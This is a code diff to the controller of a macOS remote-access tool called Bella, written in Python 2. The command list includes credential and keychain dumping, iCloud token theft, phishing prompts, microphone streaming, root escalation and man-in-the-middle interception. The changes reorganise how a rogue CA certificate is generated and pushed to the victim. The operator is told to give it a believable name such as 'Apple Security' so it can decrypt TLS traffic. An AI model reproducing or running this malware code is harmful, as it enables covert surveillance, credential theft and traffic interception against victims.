@@ -24,7 +24,7 @@ greenCheck = "%s[+] %s" % (green, endC)
 bluePlus = "%s[*] %s" % (blue, endC)
 yellow_star = "%s[*] %s" % (yellow, endC)
 
-commands = ['iCloud_query', 'update_db_entry', 'version', 'set_client_name', 'update_server', 'interactive_shell','upload', 'download', 'screen_shot', 'iCloud_contacts', 'iCloud_FMF', 'chrome_dump', 'shutdown_server', 'iCloud_FMIP', 'chrome_safe_storage', 'insomnia_load', 'insomnia_unload', 'iCloud_token', 'iCloud_phish', 'mike_stream', 'reboot_server', 'safari_history', 'check_backups','keychain_download', 'mitm_start', 'mitm_kill', 'chat_history', 'get_root', 'bella_info', 'current_users', 'sysinfo', 'user_pass_phish', 'removeserver_yes']
+commands = ['iCloud_query', 'update_db_entry', 'volume', 'version', 'set_client_name', 'update_server', 'interactive_shell','upload', 'download', 'screen_shot', 'iCloud_contacts', 'iCloud_FMF', 'chrome_dump', 'shutdown_server', 'iCloud_FMIP', 'chrome_safe_storage', 'insomnia_load', 'insomnia_unload', 'iCloud_token', 'iCloud_phish', 'mike_stream', 'reboot_server', 'safari_history', 'check_backups','keychain_download', 'mitm_start', 'mitm_kill', 'chat_history', 'get_root', 'bella_info', 'current_users', 'sysinfo', 'user_pass_phish', 'removeserver_yes']
 
 def subprocess_cleanup(subprocess_list):
     if len(subprocess_list) > 0:
@@ -144,7 +144,7 @@ def main():
     ctrlC = False
     active=False
     first_run = True
-    cc_version = '1.20'
+    cc_version = '1.21'
     logpath = 'Logs/'
     helperpath = os.getcwd() + '/'
     client_log_path = ''
@@ -352,7 +352,7 @@ def main():
                             tell application \"Terminal\"\n\
                             do script \"mitmproxy -p 8081 --cadir %s\"\n\
                             end tell\n\
-                            EOF" % helperpath)
+                            EOF" % (helperpath + 'MITM'))
                     print 'MITM-ing. RUN mitm_kill AFTER YOU CLOSE MITMPROXY OR THE CLIENT\'S INTERNET WILL NOT WORK.'
 
                 elif data.startswith('keychain_download'):
@@ -508,27 +508,41 @@ def main():
                         except ImportError:
                             print 'You need to install the python library "mitmproxy" to use this function.'
                             nextcmd = ''
-                        if not os.path.isfile("%smitm.crt" % helperpath):
+                        if not os.path.isdir('MITM'):
+                            os.mkdir('MITM')
+                        if not os.path.isfile("%sMITM/mitm.crt" % helperpath):
                             print "%sNo local Certificate Authority found.\nThis is necessary to decrypt TLS/SSL traffic.\nFollow the steps below to generate the certificates.%s\n\n" % (red, endC)
                             os.system("openssl genrsa -out mitm.key 2048")
                             print "%s\n\nYou can put any information here. Common Name is what will show up in the Keychain, so you may want to make this a believable name (IE 'Apple Security').%s\n\n" % (red, endC)
                             os.system("openssl req -new -x509 -key mitm.key -out mitm.crt")
                             os.system("cat mitm.key mitm.crt > mitmproxy-ca.pem")
                             os.remove("mitm.key")
+                            os.system("mv mitm.crt MITM/")
+                            os.system("mv mitmproxy-ca.pem MITM/mitmproxy-ca.pem")
                             #mitm.crt is the cert we will install on remote client.
                             #mitmproxy-ca.pem is for mitmproxy
                             print '%sGenerated all certs. Sending over to client.%s' % (green, endC)
-                        with open('%smitm.crt' % helperpath, 'r') as content:
+                        with open('%sMITM/mitm.crt' % helperpath, 'r') as content:
                             cert = content.read()
                         print 'Found the following certificate:'
-                        for x in subprocess.check_output("keytool -printcert -file %smitm.crt" % helperpath, shell=True).splitlines():
+                        for x in subprocess.check_output("keytool -printcert -file %sMITM/mitm.crt" % helperpath, shell=True).splitlines():
                             if 'Issuer: ' in x:
                                 print "%s%s%s" % (lightBlue, x, endC)
+                        new_cert = raw_input("Would you like to generate a new certificate? (y/n): ")
+                        if new_cert.lower() == 'y':
+                            print "%sNo local Certificate Authority found.\nThis is necessary to decrypt TLS/SSL traffic.\nFollow the steps below to generate the certificates.%s\n\n" % (red, endC)
+                            os.system("openssl genrsa -out mitm.key 2048")
+                            print "%s\n\nYou can put any information here. Common Name is what will show up in the Keychain, so you may want to make this a believable name (IE 'Apple Security').%s\n\n" % (red, endC)
+                            os.system("openssl req -new -x509 -key mitm.key -out mitm.crt")
+                            os.system("cat mitm.key mitm.crt > mitmproxy-ca.pem")
+                            os.remove("mitm.key")
+                            os.system("mv mitm.crt MITM/")
+                            os.system("mv mitmproxy-ca.pem MITM/mitmproxy-ca.pem")
                         interface = raw_input("🚀  Specify an interface to MITM [Press enter for Wi-Fi]: ").replace("[", "").replace("]", "") or "Wi-Fi"
                         nextcmd = "mitm_start:::%s:::%s" % (interface, cert)
 
                     if nextcmd == ("mitm_kill"):
-                        for x in subprocess.check_output("keytool -printcert -file %smitm.crt" % helperpath, shell=True).splitlines():
+                        for x in subprocess.check_output("keytool -printcert -file %sMITM/mitm.crt" % helperpath, shell=True).splitlines():
                             if 'SHA1: ' in x:
                                 certsha = ''.join(x.split(':')[1:]).replace(' ', '')
                                 break
